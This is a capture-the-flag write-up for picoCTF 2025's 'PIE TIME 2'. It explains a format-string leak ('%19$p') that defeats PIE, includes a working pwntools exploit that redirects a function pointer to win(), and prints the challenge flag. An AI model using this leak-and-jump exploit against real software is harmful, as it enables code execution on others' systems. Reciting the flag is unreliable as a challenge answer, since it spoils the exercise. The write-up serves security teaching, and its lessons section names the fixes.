# PIE TIME 2 (picoCTF 2025) - Writeup

## Category: Binary Exploitation / Pwn - Format String Leak + Function Pointer Jump
## Difficulty: Medium

### Challenge Description
> The program's source code can be downloaded here. The binary can be downloaded here.
> Hint 1: What vulnerability can be exploited to leak the address?

Target: `nc rescued-float.picoctf.net <port>`
The binary is a **PIE** (Position-Independent Executable) with ASLR enabled — the code is
loaded at a random base address on every run, so hardcoded function addresses never work.

### Source Analysis (`vuln.c`)
```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);                       // VULN 1: format string (user-controlled fmt)
  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  void (*foo)(void) = (void (*)())val;  // VULN 2: call user-supplied function pointer
  foo();
}
int win() { /* prints flag.txt */ }
int main() {
  signal(SIGSEGV, segfault_handler);    // prints "Segfault Occurred" and exits
  setvbuf(stdout, NULL, _IONBF, 0);
  call_functions();
  return 0;
}
```
`win()` (the flag printer) exists in the binary but is never called in normal control flow.

### Recon
1. `file vuln` -> `ELF 64-bit ... pie executable` (PIE confirmed). `checksec` shows PIE.
2. `nm vuln | grep -wE "main|win"` -> `main=0x133d`, `win=0x12a7`. Compile-time **offsets are
   stable** even though the runtime base is random: `main - win = 0x96`.
3. Program echoes the name with `printf(buffer)` -> format string. Fed `%p %p ...` -> leaked
   stack; fed `%19$p` -> leaked `0x5cb049319441` which is `main+0x41` (a return address inside
   main). Leak slot 19 -> `main+0x41`.

### Exploitation
```python
from pwn import *
r = remote('rescued-float.picoctf.net', 50075)
r.recvuntil(b'Enter your name:')
r.sendline(b'%19$p')                     # leak main+0x41
leak = int(r.recvline().split(b' ')[0], 16)
win = leak - 0x41 - (0x133d - 0x12a7)    # = leak - 0xD7
r.sendlineafter(b'enter the address to jump to, ex => 0x12345: ', hex(win).encode())
print(r.recvall().decode())
```
Result: `You won!` + flag.

### Flag
```
picoCTF{p13_5h0u1dn'7_134k_c9a04879}
```
*(Instance-specific suffix; core string `p13_5h0u1dn'7_134k_` is stable across instances.)*

### Why It Worked
1. **Format string (`printf(buffer)`)** let us read arbitrary stack slots with `%N$p`,
   defeating ASLR: slot 19 held a return address inside `main` (`main+0x41`), which pins the
   PIE base for that run.
2. **`foo()` function pointer call** was the sink: by supplying `win`'s address we redirected
   control flow into the flag-printer. Because the leaked pointer and `win` share the same
   randomized base, their **fixed compile-time offset** (0x96) made the computation exact.
3. The `SIGSEGV` handler merely reported bad addresses ("Segfault Occurred, incorrect
   address.") — a useful feedback signal, not a security control.

### Lessons Learned
- PIE binaries: function offsets are constant; the base is random. Any single leaked code
  pointer + `nm` offsets is enough to compute any other function's address.
- `printf(user_input)` is always a format string bug -> use `printf("%s", buf)`.
- Calling a user-supplied integer as a function pointer is arbitrary code execution by
  design — validate/whitelist addresses if a jump prompt is required.
- Positional `%N$p` reads one specific stack/register slot cleanly; a bulk `%p` dump finds
  candidate slots, then narrow with gdb (disas main/win to confirm what a leak points at).
- "Segfault Occurred" after jumping = wrong address: recompute and retry, same connection
  pattern (leak stage 1, jump stage 2).

### Reusable Artifacts
- Skill: `skills/pwn/PIEBypass.md` (new category)
- Payloads: `payloads/FormatString.txt` (new)
- Script: `scripts/pwn_pie_leak.py` (new, CLI-parameterized)
- Template: `templates/pie_jump_template.py` (new)
- Notes: `notes/patterns.md`, `notes/lessons_learned.md`
- Playbook: `playbooks/picoCTF.md` (decision tree + enumeration entry)

### References
- picoCTF 2025 PIE TIME 2 (pwn, Medium): https://play.picoctf.org/practice/challenge/490
- PayloadsAllTheThings - Format String: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Format%20String/README.md
